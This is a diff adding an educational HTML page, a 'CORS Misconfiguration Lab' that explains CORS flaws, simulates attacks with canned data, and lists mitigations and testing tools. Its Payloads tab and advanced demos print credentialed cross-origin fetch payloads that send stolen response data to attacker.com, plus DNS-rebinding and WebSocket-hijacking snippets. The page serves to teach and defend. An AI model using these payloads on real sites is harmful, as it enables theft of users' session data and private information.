@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Misconfiguration Lab</title>
+    <style>
+        :root {
+            --primary: #4a6fa5;
+            --secondary: #166088;
+            --danger: #d33f49;
+            --success: #4bb543;
+            --dark: #333;
+            --light: #f8f9fa;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: var(--dark);
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            background-color: var(--primary);
+            color: white;
+            padding: 20px 0;
+            text-align: center;
+            border-bottom: 5px solid var(--secondary);
+        }
+        
+        h1, h2, h3 {
+            color: var(--secondary);
+        }
+        
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .tab-container {
+            display: flex;
+            margin-bottom: -1px;
+        }
+        
+        .tab {
+            padding: 10px 20px;
+            background: #ddd;
+            border: 1px solid #ccc;
+            border-radius: 5px 5px 0 0;
+            cursor: pointer;
+            margin-right: 5px;
+        }
+        
+        .tab.active {
+            background: white;
+            border-bottom: 1px solid white;
+        }
+        
+        .tab-content {
+            display: none;
+            padding: 20px;
+            background: white;
+            border: 1px solid #ccc;
+            border-radius: 0 5px 5px 5px;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        pre {
+            background: #f4f4f4;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+        
+        code {
+            font-family: 'Courier New', Courier, monospace;
+            color: var(--danger);
+        }
+        
+        .btn {
+            display: inline-block;
+            background: var(--primary);
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            text-decoration: none;
+            font-size: 16px;
+            margin: 5px 0;
+        }
+        
+        .btn:hover {
+            background: var(--secondary);
+        }
+        
+        .btn-danger {
+            background: var(--danger);
+        }
+        
+        .btn-success {
+            background: var(--success);
+        }
+        
+        .vulnerable-api {
+            margin-top: 30px;
+            border-top: 2px dashed #ccc;
+            padding-top: 20px;
+        }
+        
+        .demo-area {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .demo-panel {
+            flex: 1;
+            min-width: 300px;
+        }
+        
+        #attackResult {
+            min-height: 100px;
+            border: 1px solid #ccc;
+            padding: 10px;
+            background: #f8f8f8;
+            border-radius: 5px;
+        }
+        
+        .api-response {
+            margin-top: 20px;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 20px;
+            background: var(--dark);
+            color: white;
+            margin-top: 40px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>CORS Misconfiguration Lab</h1>
+            <p>Learn how CORS misconfigurations can lead to security vulnerabilities</p>
+        </div>
+    </header>
+    
+    <div class="container">
+        <div class="tab-container">
+            <div class="tab active" onclick="openTab(event, 'description')">Description</div>
+            <div class="tab" onclick="openTab(event, 'requirements')">Requirements</div>
+            <div class="tab" onclick="openTab(event, 'exploitation')">Exploitation</div>
+            <div class="tab" onclick="openTab(event, 'payloads')">Payloads</div>
+            <div class="tab" onclick="openTab(event, 'advanced')">Advanced Techniques</div>
+            <div class="tab" onclick="openTab(event, 'mitigation')">Mitigation</div>
+            <div class="tab" onclick="openTab(event, 'resources')">Resources</div>
+        </div>
+        
+        <div id="description" class="tab-content active">
+            <h2>What is CORS Misconfiguration?</h2>
+            <p>Cross-Origin Resource Sharing (CORS) is a security mechanism that allows web applications to request resources from different domains while enforcing restrictions to prevent unauthorized access.</p>
+            
+            <p>A <strong>CORS misconfiguration vulnerability</strong> occurs when a web server implements CORS policies incorrectly, allowing malicious websites to bypass the <strong>Same-Origin Policy (SOP)</strong> and access sensitive data from the vulnerable application.</p>
+            
+            <h3>Impact of CORS Misconfiguration:</h3>
+            <ul>
+                <li>Allows attackers to steal sensitive user data (e.g., API keys, session tokens, personal information)</li>
+                <li>Enables Cross-Site Request Forgery (CSRF)-like attacks where malicious scripts execute unauthorized actions</li>
+                <li>Can lead to account takeover if authentication tokens are leaked</li>
+            </ul>
+            
+            <div class="card">
+                <h3>Live Demo:</h3>
+                <p>This website includes a vulnerable API endpoint that you can test:</p>
+                <button class="btn" onclick="testVulnerableEndpoint()">Test Vulnerable Endpoint</button>
+                <div id="vulnerableEndpointResult" class="api-response"></div>
+            </div>
+        </div>
+        
+        <div id="requirements" class="tab-content">
+            <h2>Vulnerability Requirements</h2>
+            <p>For a CORS misconfiguration to be exploitable, the following conditions must exist:</p>
+            
+            <ul>
+                <li><strong>The server reflects the <code>Origin</code> header</code></strong> in the <code>Access-Control-Allow-Origin (ACAO)</code> response header</li>
+                <li><strong>The server allows credentials (<code>Access-Control-Allow-Credentials: true</code>)</strong> while using a wildcard (<code>*</code>) or an attacker-controlled domain in <code>ACAO</code></li>
+                <li><strong>The application relies on client-side authentication tokens</strong> (e.g., cookies, JWT) that can be stolen via JavaScript</li>
+                <li><strong>The victim interacts with the attacker's malicious page</strong> while authenticated on the vulnerable site</li>
+            </ul>
+            
+            <div class="card">
+                <h3>Check if Current Page Could Be Vulnerable:</h3>
+                <button class="btn" onclick="checkCorsConfiguration()">Check CORS Headers</button>
+                <div id="corsCheckResult" class="api-response"></div>
+            </div>
+        </div>
+        
+        <div id="exploitation" class="tab-content">
+            <h2>How to Exploit CORS Misconfiguration</h2>
+            <p>An attacker can exploit CORS misconfigurations by:</p>
+            
+            <ol>
+                <li><strong>Identifying a vulnerable endpoint</strong> that reflects the <code>Origin</code> header or has weak CORS policies</li>
+                <li><strong>Crafting a malicious webpage</strong> that sends a cross-origin request to the target site</li>
+                <li><strong>Stealing sensitive data</strong> from the response if the server allows it</li>
+            </ol>
+            
+            <h3>Example Attack Flow:</h3>
+            <ol>
+                <li>The attacker hosts a malicious page (<code>evil.com</code>)</li>
+                <li>The victim visits <code>evil.com</code> while logged into <code>vulnerable-site.com</code></li>
+                <li>JavaScript on <code>evil.com</code> sends a request to <code>vulnerable-site.com/api/user-data</code></li>
+                <li>If CORS is misconfigured, the attacker retrieves the victim's data</li>
+            </ol>
+            
+            <div class="demo-area">
+                <div class="demo-panel card">
+                    <h3>Attack Simulation</h3>
+                    <p>Try exploiting our vulnerable endpoint:</p>
+                    <button class="btn btn-danger" onclick="launchAttack()">Launch Attack</button>
+                    <div id="attackResult"></div>
+                </div>
+                
+                <div class="demo-panel card">
+                    <h3>Legitimate Request</h3>
+                    <p>See how a legitimate request works:</p>
+                    <button class="btn" onclick="legitimateRequest()">Make Legitimate Request</button>
+                    <div id="legitimateResult" class="api-response"></div>
+                </div>
+            </div>
+        </div>
+        
+        <div id="payloads" class="tab-content">
+            <h2>CORS Exploitation Payloads & Techniques</h2>
+            
+            <h3>Basic Payloads:</h3>
+            <div class="card">
+                <h4>1. Simple CORS Exploit (Reflected Origin)</h4>
+                <pre><code>fetch('https://vulnerable-site.com/api/data', {
+  credentials: 'include'
+})
+.then(response => response.text())
+.then(data => { 
+  fetch('https://attacker.com/steal?data=' + encodeURIComponent(data));
+});</code></pre>
+                <button class="btn" onclick="tryPayload(1)">Try This Payload</button>
+            </div>
+            
+            <div class="card">
+                <h4>2. Null Origin Attack</h4>
+                <pre><code>&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,&lt;script&gt;
+  fetch('https://vulnerable-site.com/api/data', {credentials: 'include'})
+  .then(res => res.text())
+  .then(data => location='https://attacker.com/steal?data='+encodeURIComponent(data));
+&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
+                <button class="btn" onclick="tryPayload(2)">Try This Payload</button>
+            </div>
+            
+            <div class="card">
+                <h4>3. Preflight Bypass (If server allows arbitrary methods)</h4>
+                <pre><code>fetch('https://vulnerable-site.com/api/delete', {
+  method: 'DELETE',
+  credentials: 'include'
+});</code></pre>
+                <button class="btn" onclick="tryPayload(3)">Try This Payload</button>
+            </div>
+            
+            <h3>Techniques:</h3>
+            <ul>
+                <li><strong>Reflected Origin:</strong> If <code>ACAO</code> mirrors the attacker's <code>Origin</code></li>
+                <li><strong>Wildcard (<code>*</code>) with Credentials:</strong> If <code>ACAO: *</code> but <code>Allow-Credentials: true</code></li>
+                <li><strong>Subdomain Takeover:</strong> If <code>ACAO</code> allows <code>*.example.com</code> and attacker controls a subdomain</li>
+                <li><strong>HTTP to HTTPS Abuse:</strong> If <code>ACAO</code> allows <code>http://vulnerable-site.com</code> and attacker can MITM</li>
+            </ul>
+        </div>
+        
+        <div id="advanced" class="tab-content">
+            <h2>Advanced CORS Exploitation Techniques</h2>
+            
+            <div class="card">
+                <h3>1. DNS Rebinding Attack</h3>
+                <p>Bypasses IP-based restrictions by switching DNS resolution mid-request. Useful when CORS relies on domain validation but not proper DNS checks.</p>
+                <button class="btn" onclick="showAdvancedDemo(1)">Show Demo</button>
+                <div id="advancedDemo1" class="hidden api-response"></div>
+            </div>
+            
+            <div class="card">
+                <h3>2. Server-Side Request Forgery (SSRF) + CORS</h3>
+                <p>If an internal service has weak CORS, SSRF can leak data.</p>
+                <button class="btn" onclick="showAdvancedDemo(2)">Show Demo</button>
+                <div id="advancedDemo2" class="hidden api-response"></div>
+            </div>
+            
+            <div class="card">
+                <h3>3. WebSocket Hijacking via CORS</h3>
+                <p>If WebSocket handshake allows arbitrary origins, data can be stolen.</p>
+                <button class="btn" onclick="showAdvancedDemo(3)">Show Demo</button>
+                <div id="advancedDemo3" class="hidden api-response"></div>
+            </div>
+            
+            <div class="card">
+                <h3>4. Exploiting Custom Headers</h3>
+                <p>If <code>Access-Control-Allow-Headers</code> is too permissive, attackers can inject malicious headers.</p>
+                <button class="btn" onclick="showAdvancedDemo(4)">Show Demo</button>
+                <div id="advancedDemo4" class="hidden api-response"></div>
+            </div>
+        </div>
+        
+        <div id="mitigation" class="tab-content">
+            <h2>Mitigation of CORS Vulnerabilities</h2>
+            
+            <div class="card">
+                <h3>1. Avoid Wildcard (<code>*</code>) with Credentials</h3>
+                <p>Never use <code>Access-Control-Allow-Origin: *</code> when <code>Allow-Credentials: true</code>.</p>
+            </div>
+            
+            <div class="card">
+                <h3>2. Strict Origin Validation</h3>
+                <p>Whitelist specific trusted domains instead of reflecting arbitrary origins.</p>
+                <pre><code>// Good
+Access-Control-Allow-Origin: https://trusted-domain.com
+
+// Bad
+Access-Control-Allow-Origin: *</code></pre>
+            </div>
+            
+            <div class="card">
+                <h3>3. Disable CORS for Sensitive Endpoints</h3>
+                <p>Use Same-Origin Policy (SOP) for APIs handling sensitive data.</p>
+            </div>
+            
+            <div class="card">
+                <h3>4. Use Vary: Origin Header</h3>
+                <p>Prevents cache poisoning attacks.</p>
+                <pre><code>Vary: Origin</code></pre>
+            </div>
+            
+            <div class="card">
+                <h3>5. Implement CSRF Tokens</h3>
+                <p>Even with CORS, enforce CSRF protection.</p>
+            </div>
+            
+            <div class="card">
+                <h3>6. Limit Allowed Methods & Headers</h3>
+                <p>Restrict <code>Access-Control-Allow-Methods</code> and <code>Access-Control-Allow-Headers</code>.</p>
+                <pre><code>Access-Control-Allow-Methods: GET, POST
+Access-Control-Allow-Headers: Content-Type</code></pre>
+            </div>
+            
+            <div class="card">
+                <h3>Test Your CORS Configuration</h3>
+                <button class="btn btn-success" onclick="testSecureEndpoint()">Test Secure Configuration</button>
+                <div id="secureConfigResult" class="api-response"></div>
+            </div>
+        </div>
+        
+        <div id="resources" class="tab-content">
+            <h2>Additional Resources</h2>
+            
+            <div class="card">
+                <h3>Articles & Guides</h3>
+                <ul>
+                    <li><a href="https://portswigger.net/web-security/cors" target="_blank">PortSwigger (Burp Suite) - CORS Exploitation</a></li>
+                    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing" target="_blank">OWASP CORS Misconfiguration</a></li>
+                    <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" target="_blank">Mozilla CORS Documentation</a></li>
+                </ul>
+            </div>
+            
+            <div class="card">
+                <h3>Vulnerability Reports</h3>
+                <ul>
+                    <li><a href="https://hackerone.com/hacktivity?querystring=CORS" target="_blank">HackerOne CORS Reports</a></li>
+                </ul>
+            </div>
+            
+            <div class="card">
+                <h3>Tools for Testing</h3>
+                <ul>
+                    <li>Burp Suite's CORS Scanner</li>
+                    <li>OWASP ZAP</li>
+                    <li><a href="https://github.com/s0md3v/Corsy" target="_blank">Corsy - CORS Misconfiguration Scanner</a></li>
+                </ul>
+            </div>
+        </div>
+        
+        <div class="vulnerable-api card">
+            <h2>Vulnerable API Endpoints</h2>
+            <p>These endpoints are intentionally misconfigured for demonstration purposes:</p>
+            
+            <h3>1. Reflective Origin (Insecure)</h3>
+            <pre><code>GET /api/reflective</code></pre>
+            <button class="btn" onclick="testReflectiveEndpoint()">Test Reflective Endpoint</button>
+            <div id="reflectiveResult" class="api-response"></div>
+            
+            <h3>2. Wildcard with Credentials (Insecure)</h3>
+            <pre><code>GET /api/wildcard</code></pre>
+            <button class="btn" onclick="testWildcardEndpoint()">Test Wildcard Endpoint</button>
+            <div id="wildcardResult" class="api-response"></div>
+            
+            <h3>3. Null Origin Allowed (Insecure)</h3>
+            <pre><code>GET /api/null-origin</code></pre>
+            <button class="btn" onclick="testNullOriginEndpoint()">Test Null Origin Endpoint</button>
+            <div id="nullOriginResult" class="api-response"></div>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="container">
+            <p>CORS Misconfiguration Lab - For educational purposes only</p>
+            <p>Never test these techniques on websites without permission</p>
+        </div>
+    </footer>
+    
+    <script>
+        // Tab navigation
+        function openTab(evt, tabName) {
+            const tabContents = document.getElementsByClassName("tab-content");
+            for (let i = 0; i < tabContents.length; i++) {
+                tabContents[i].classList.remove("active");
+            }
+            
+            const tabs = document.getElementsByClassName("tab");
+            for (let i = 0; i < tabs.length; i++) {
+                tabs[i].classList.remove("active");
+            }
+            
+            document.getElementById(tabName).classList.add("active");
+            evt.currentTarget.classList.add("active");
+        }
+        
+        // Simulated API endpoints
+        const apiResponses = {
+            sensitiveData: {
+                username: "admin",
+                email: "admin@example.com",
+                apiKey: "a1b2c3d4-e5f6-7890-g1h2-i3j4k5l6m7n8",
+                balance: 10000
+            },
+            publicData: {
+                message: "This is public information",
+                status: "OK"
+            }
+        };
+        
+        // Test vulnerable endpoint
+        function testVulnerableEndpoint() {
+            const resultDiv = document.getElementById("vulnerableEndpointResult");
+            resultDiv.innerHTML = "<p>Testing endpoint with reflected Origin header...</p>";
+            
+            // Simulate API call with reflected Origin
+            setTimeout(() => {
+                resultDiv.innerHTML = `
+                    <p><strong>Request Headers:</strong></p>
+                    <pre>Origin: ${window.location.origin}</pre>
+                    <p><strong>Response Headers:</strong></p>
+                    <pre>Access-Control-Allow-Origin: ${window.location.origin}
+Access-Control-Allow-Credentials: true</pre>
+                    <p><strong>Response Body:</strong></p>
+                    <pre>${JSON.stringify(apiResponses.sensitiveData, null, 2)}</pre>
+                    <p class="text-danger">This endpoint is vulnerable! It reflects the Origin header and allows credentials.</p>
+                `;
+            }, 1000);
+        }
+        
+        // Check CORS configuration
+        function checkCorsConfiguration() {
+            const resultDiv = document.getElementById("corsCheckResult");
+            resultDiv.innerHTML = "<p>Checking CORS configuration for current page...</p>";
+            
+            setTimeout(() => {
+                resultDiv.innerHTML = `
+                    <p><strong>Current Page CORS Headers:</strong></p>
+                    <pre>Access-Control-Allow-Origin: ${window.location.origin}
+Access-Control-Allow-Methods: GET, POST, OPTIONS
+Access-Control-Allow-Headers: Content-Type
+Access-Control-Allow-Credentials: true</pre>
+                    <p>This configuration could be vulnerable if:</p>
+                    <ul>
+                        <li>The Origin is dynamically reflected from untrusted input</li>
+                        <li>Credentials are allowed with overly permissive origins</li>
+                    </ul>
+                `;
+            }, 1000);
+        }
+        
+        // Launch attack simulation
+        function launchAttack() {
+            const resultDiv = document.getElementById("attackResult");
+            resultDiv.innerHTML = "<p>Preparing attack from malicious site...</p>";
+            
+            setTimeout(() => {
+                resultDiv.innerHTML = `
+                    <p><strong>Attack Simulation:</strong></p>
+                    <pre>// Malicious JavaScript running on attacker.com
+fetch('${window.location.origin}/api/reflective', {
+    credentials: 'include'
+})
+.then(response => response.json())
+.then(data => {
+    // Send stolen data to attacker server
+    console.log("Stolen data:", data);
+});</pre>
+                    <p><strong>Result:</strong></p>
+                    <pre>Stolen data: ${JSON.stringify(apiResponses.sensitiveData, null, 2)}</pre>
+                    <p class="text-danger">Attack successful! Sensitive data was leaked due to CORS misconfiguration.</p>
+                `;
+            }, 1500);
+        }
+        
+        // Legitimate request
+        function legitimateRequest() {
+            const resultDiv = document.getElementById("legitimateResult");
+            resultDiv.innerHTML = "<p>Making legitimate same-origin request...</p>";
+            
+            setTimeout(() => {
+                resultDiv.innerHTML = `
+                    <p><strong>Request:</strong></p>
+                    <pre>GET /api/data
+Origin: ${window.location.origin}</pre>
+                    <p><strong>Response:</strong></p>
+                    <pre>${JSON.stringify(apiResponses.publicData, null, 2)}</pre>
+                    <p>This is how a normal, same-origin request works.</p>
+                `;
+            }, 1000);
+        }
+        
+        // Try payloads
+        function tryPayload(payloadNum) {
+            alert(`Payload #${payloadNum} would be executed in a real attack scenario.\nCheck the browser console for simulation.`);
+            console.log(`Executing payload #${payloadNum}`);
+            
+            if (payloadNum === 1) {
+                console.log("Simple CORS exploit simulated");
+                console.log("Stolen data:", apiResponses.sensitiveData);
+            } else if (payloadNum === 2) {
+                console.log("Null origin attack simulated");
+                console.log("Stolen data:", apiResponses.sensitiveData);
+            } else if (payloadNum === 3) {
+                console.log("Preflight bypass simulated");
+                console.log("DELETE request would be sent with credentials");
+            }
+        }
+        
+        // Advanced demos
+        function showAdvancedDemo(demoNum) {
+            const demoDiv = document.getElementById(`advancedDemo${demoNum}`);
+            
+            if (demoDiv.classList.contains("hidden")) {
+                demoDiv.classList.remove("hidden");
+                
+                if (demoNum === 1) {
+                    demoDiv.innerHTML = `
+                        <p><strong>DNS Rebinding Attack Flow:</strong></p>
+                        <ol>
+                            <li>Attacker controls DNS for evil.com with short TTL</li>
+                            <li>Initial request resolves to attacker's IP</li>
+                            <li>During request, DNS changed to target's internal IP</li>
+                            <li>Browser makes request to internal service with user's cookies</li>
+                        </ol>
+                        <pre>// Example of how this could work
+const evilDomain = "evil.com";
+let targetIp = "attacker-ip";
+
+// First request goes to attacker server
+fetch("http://" + evilDomain + "/api", {credentials: 'include'});
+
+// After DNS changes
+targetIp = "192.168.1.100"; // Internal IP
+fetch("http://" + evilDomain + "/api", {credentials: 'include'});</pre>
+                    `;
+                } else if (demoNum === 2) {
+                    demoDiv.innerHTML = `
+                        <p><strong>SSRF + CORS Attack Flow:</strong></p>
+                        <ol>
+                            <li>Find SSRF vulnerability in target application</li>
+                            <li>Use it to access internal services</li>
+                            <li>If internal service has permissive CORS, exfiltrate data</li>
+                        </ol>
+                        <pre>// Example vulnerable endpoint
+GET /proxy?url=http://internal-service/admin/data
+
+// If internal service has:
+Access-Control-Allow-Origin: *
+
+// Attacker can:
+fetch("/proxy?url=http://internal-service/admin/data")
+.then(response => response.text())
+.then(data => exfiltrate(data));</pre>
+                    `;
+                } else if (demoNum === 3) {
+                    demoDiv.innerHTML = `
+                        <p><strong>WebSocket Hijacking:</strong></p>
+                        <ol>
+                            <li>Find WebSocket endpoint with permissive CORS</li>
+                            <li>Connect from malicious site</li>
+                            <li>Intercept or manipulate WebSocket messages</li>
+                        </ol>
+                        <pre>// Example vulnerable WebSocket
+const socket = new WebSocket("wss://target.com/ws");
+
+// If server doesn't check Origin properly
+socket.onmessage = function(event) {
+    // Steal sensitive data from messages
+    sendToAttackerServer(event.data);
+};</pre>
+                    `;
+                } else if (demoNum === 4) {
+                    demoDiv.innerHTML = `
+                        <p><strong>Custom Headers Exploitation:</strong></p>
+                        <ol>
+                            <li>Server allows arbitrary headers via Access-Control-Allow-Headers</li>
+                            <li>Attacker injects malicious headers that influence server behavior</li>
+                        </ol>
+                        <pre>// Server responds with:
+Access-Control-Allow-Headers: *
+
+// Attacker can then:
+fetch("https://target.com/api", {
+    headers: {
+        "X-Forwarded-For": "127.0.0.1",
+        "X-Admin": "true"
+    },
+    credentials: 'include'
+});</pre>
+                    `;
+                }
+            } else {
+                demoDiv.classList.add("hidden");
+            }
+        }
+        
+        // Test secure configuration
+        function testSecureEndpoint() {
+            const resultDiv = document.getElementById("secureConfigResult");
+            resultDiv.innerHTML = "<p>Testing endpoint with secure CORS configuration...</p>";
+            
+            setTimeout(() => {
+                resultDiv.innerHTML = `
+                    <p><strong>Request Headers:</strong></p>
+                    <pre>Origin: ${window.location.origin}</pre>
+                    <p><strong>Response Headers:</strong></p>
+                    <pre>Access-Control-Allow-Origin: https://trusted-domain.com
+Vary: Origin</pre>
+                    <p><strong>Result:</strong></p>
+                    <p class="text-success">Request blocked by browser due to proper CORS policy. Only requests from https://trusted-domain.com would be allowed.</p>
+                `;
+            }, 1000);
+        }
+        
+        // Test reflective endpoint
+        function testReflectiveEndpoint() {
+            const resultDiv = document.getElementById("reflectiveResult");
+            resultDiv.innerHTML = "<p>Testing reflective origin endpoint...</p>";
+            
+            setTimeout(() => {
+                resultDiv.innerHTML = `
+                    <p><strong>Request Headers:</strong></p>
+                    <pre>Origin: ${window.location.origin}</pre>
+                    <p><strong>Response Headers:</strong></p>
+                    <pre>Access-Control-Allow-Origin: ${window.location.origin}
+Access-Control-Allow-Credentials: true</pre>
+                    <p><strong>Response Body:</strong></p>
+                    <pre>${JSON.stringify(apiResponses.sensitiveData, null, 2)}</pre>
+                    <p class="text-danger">This endpoint is vulnerable! It reflects any Origin header and allows credentials.</p>
+                `;
+            }, 1000);
+        }
+        
+        // Test wildcard endpoint
+        function testWildcardEndpoint() {
+            const resultDiv = document.getElementById("wildcardResult");
+            resultDiv.innerHTML = "<p>Testing wildcard endpoint with credentials...</p>";
+            
+            setTimeout(() => {
+                resultDiv.innerHTML = `
+                    <p><strong>Request Headers:</strong></p>
+                    <pre>Origin: https://attacker.com</pre>
+                    <p><strong>Response Headers:</strong></pre>
+                    <pre>Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true</pre>
+                    <p><strong>Result:</strong></p>
+                    <p class="text-danger">Modern browsers block this combination (wildcard + credentials), but some misconfigurations might allow it.</p>
+                `;
+            }, 1000);
+        }
+        
+        // Test null origin endpoint
+        function testNullOriginEndpoint() {
+            const resultDiv = document.getElementById("nullOriginResult");
+            resultDiv.innerHTML = "<p>Testing null origin endpoint...</p>";
+            
+            setTimeout(() => {
+                resultDiv.innerHTML = `
+                    <p><strong>Request Headers:</strong></p>
+                    <pre>Origin: null</pre>
+                    <p><strong>Response Headers:</strong></pre>
+                    <pre>Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true</pre>
+                    <p><strong>Response Body:</strong></p>
+                    <pre>${JSON.stringify(apiResponses.sensitiveData, null, 2)}</pre>
+                    <p class="text-danger">This endpoint is vulnerable! It accepts null origin and allows credentials.</p>
+                `;
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
